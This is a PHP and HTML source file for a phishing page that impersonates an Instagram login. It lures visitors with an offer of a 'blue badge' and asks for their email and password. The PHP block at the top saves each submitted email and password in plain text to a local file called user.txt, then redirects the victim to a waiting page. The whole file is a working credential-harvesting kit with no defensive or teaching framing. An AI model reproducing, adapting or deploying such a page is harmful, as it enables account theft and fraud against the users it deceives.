<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];
    $data = "Email: " . $email . "\nPassword: " . $password . "\n";
    file_put_contents("user.txt", $data);
    header("Location: wait.php");
    exit();
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Login</title>
  <style>
    body {
      background: linear-gradient(to bottom, #f0f8ff, #ffffff);
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .login-box {
      border: 1px solid rgba(91, 91, 91, 0.2);
      background: white;
      padding: 40px;
      border-radius: 16px;
      box-shadow: 0 0 15px rgba(0, 123, 255, 0.2);
      text-align: center;
      width: 320px;
    }

    .login-box img {
      width: 60px;
      margin-bottom: 20px;
    }

    .login-box h2 {
      color: #007bff;
      margin-bottom: 20px;
    }

    .login-box input[type="text"],
    .login-box input[type="password"] {
      width: 100%;
      padding: 12px;
      margin: 8px 0;
      border: 1px solid #ccc;
      border-radius: 8px;
      box-sizing: border-box;
    }

    .login-box button {
      background-color: #007bff;
      color: white;
      padding: 12px;
      width: 100%;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      margin-top: 10px;
      font-weight: bold;
    }

    .login-box button:hover {
      background-color: #0056b3;
    }

    .forgot {
      margin-top: 12px;
      display: block;
      color: #007bff;
      text-decoration: none;
      font-size: 14px;
    }

    .forgot:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>

  <form method="POST" class="login-box">

    <img src="https://www.roxo.ir/blog-panel/wp-content/uploads/2016/12/instagram-logo-free-download-6.jpg" alt="Instagram">
    <p style="text-align:center; color:#333; margin-bottom: 15px;">
    To request a blue badge, please login to your Instagram account.
    </p>

    <h2>Login</h2>

    <input type="text" name="email" placeholder="Email" required><br>
    <input type="password" name="password" placeholder="Password" required><br>

    <button type="submit">Login</button>

    <a class="forgot" href="#">Forgot password?</a>
  </form>

</body>
</html>
